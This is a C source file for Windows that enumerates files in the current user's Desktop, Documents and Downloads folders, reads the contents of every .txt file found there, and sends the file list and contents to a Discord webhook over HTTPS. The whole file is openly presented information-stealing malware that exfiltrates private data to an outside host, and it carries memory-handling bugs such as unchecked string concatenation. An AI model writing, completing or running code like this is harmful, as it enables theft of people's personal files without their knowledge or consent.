/*
    Lists all files in given folders of the current user,
    reads the contents of the txt files in these folders,
    then sends the contents of the txt files to discord via webhook.
    (not recursive)
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>

char *getUsername () {
	char *username =  getenv(("USERNAME"));
    if (!username) {
        printf("Error in getenv in getUsername func.\n");
        free(username);
        return NULL;
    }

    size_t totalSize = strlen("C:\\\\Users\\\\") + strlen(username) + 1;
    char *userpath = (char *)malloc(totalSize);
    if (!userpath) {
        printf("Error in malloc in getUsername func.\n");
        free(userpath);
        return NULL;
    }

    snprintf(userpath, totalSize, "C:\\\\Users\\\\%s", username);
	return userpath;
}

char *findFiles(){
    WIN32_FIND_DATA findFileData;
    HANDLE hFind;

    char folders[3][100] = {"\\\\Desktop\\\\", "\\\\Documents\\\\", "\\\\Downloads\\\\"};

    char *userpath = getUsername();

    size_t bufferSize = 8192;
    char *files = (char *)malloc(bufferSize);
    char *txtFiles = (char *)malloc(bufferSize);
    if (!files || !txtFiles) {
        printf("Error in malloc or in findFiles func.\n");
        free(files);
        free(txtFiles);
        return NULL;
    }

    files[0] = '\0';

    char searchPath[MAX_PATH] = ""; 

    int foldersSize = sizeof(folders) / sizeof(folders[0]); 

    for (int i = 0; i < foldersSize; i++) {
        snprintf(searchPath, MAX_PATH, "%s%s*", userpath, folders[i]);

        hFind = FindFirstFile(searchPath, &findFileData);
        if (hFind == INVALID_HANDLE_VALUE) {
            printf("Error in FindFirstFile: %d\n", GetLastError());
            return NULL;
        }

        while (FindNextFile(hFind, &findFileData) != 0) {
            if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
            snprintf(searchPath, MAX_PATH, "%s%s%s", userpath, folders[i], findFileData.cFileName);
            strcat(files, searchPath);  
            strcat(files, "#");
            }
        }

        FindClose(hFind);
    }

    free(userpath);

    return files;
}

char *readContentsofTxtFiles(char *files) {
// https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile

    char *token = strtok(files, "#");

    size_t bufferSize = 8192;
    char *txtFiles = (char *)malloc(bufferSize);
    char *contents = (char *)malloc(bufferSize);
    if (!txtFiles || !contents) {
        printf("Error in malloc or in readContentsofTxtFiles func.\n");
        free(txtFiles);
        free(contents);
        return NULL;
    }

    txtFiles[0] = '\0';
    contents[0] = '\0';

    while (token != NULL) {
        if (strstr(token, ".txt") != NULL) {
            strcat(txtFiles, token);

            HANDLE hFile = CreateFile(token,
                                      GENERIC_READ,
                                      FILE_SHARE_READ,
                                      NULL,
                                      OPEN_EXISTING,
                                      FILE_ATTRIBUTE_NORMAL,
                                      NULL);

            if (hFile == INVALID_HANDLE_VALUE) {
                printf("Error in hFile: %d\n", GetLastError());
                return NULL;
            }

            char content_data[1024] = {0};

            BOOL bReadFile = ReadFile(hFile,
                                      content_data,
                                      1024,
                                      0,
                                      NULL);

            if (bReadFile == FALSE) {
                printf("Error in ReadFile: %d\n", GetLastError());
                return NULL;
            }            
            
            strcat(contents, token);
            strcat(contents, "==>");
            strcat(contents, content_data);

            CloseHandle(hFile);
        }

        token = strtok(NULL, "#");
    }

    free(txtFiles);

    return contents;
}

void sendRequest(const char *data){
// https://learn.microsoft.com/en-us/windows/win32/winhttp/winhttp-sessions-overview

    HINTERNET hSession = WinHttpOpen(L"",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS,
                                     0);

    if (hSession == NULL) {
        printf("Error %d in WinHttpOpen.\n", GetLastError());
        return;
    }

    HINTERNET hConnect = WinHttpConnect(hSession,
                                        L"discord.com",
                                        INTERNET_DEFAULT_HTTPS_PORT,
                                        0);

    if (hConnect == NULL) {
        printf("Error %d in WinHttpConnect.\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect,
                                            L"POST",
                                            L"{DISCORD_WEBHOOK_URL}", // just the "/api/webhooks/..." part
                                            NULL,
                                            WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);

    if (hRequest == NULL) {
        printf("Error %d in WinHttpOpenRequest.\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }

    char jsonPayload[8192];
    snprintf(jsonPayload, sizeof(jsonPayload), "{\"content\": \"%s\"}", data);
    
    LPCWSTR headers = L"Content-Type: application/json\r\n";

    BOOL hSend = WinHttpSendRequest(hRequest,
                                    headers,
                                    -1L,
                                    jsonPayload,
                                    strlen(jsonPayload),
                                    strlen(jsonPayload),
                                    0);

    if (hSend == FALSE) {
        printf("Error %d in WinHttpSendRequest.\n", GetLastError());
        return;
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

int main() {

    char *files = findFiles();
    if (!files) {
        printf("Error in findFiles in main.\n");
        return 1;
    }
    printf("FILES: %s\n\n", files);

    char *filesCopy= strdup(files);
    if (!filesCopy) {
        printf("Error in strdup in main func.\n");
        return 1;
    }

    char *contents = readContentsofTxtFiles(files);
    if (!contents) {
        printf("Error in readContentsofTxtFiles in main.\n");
        return 1;
    }
    printf("CONTENTS OF TXT FILES: %s\n\n", contents);

    char *finalOutput = (char *)malloc(strlen(filesCopy) + strlen(contents) + 1);
    if (!finalOutput) {
        printf("Error in finalOutput malloc in main func.\n");
        return 1;
    }

    finalOutput[0] = '\0';

    strcat(finalOutput, filesCopy);
    strcat(finalOutput, contents);

    printf("\n");
    printf("This is what will be sent: \n%s\n", finalOutput);

    sendRequest(finalOutput);

    free(files);
    free(filesCopy);
    free(contents);
    free(finalOutput);
    
	return 0;
}
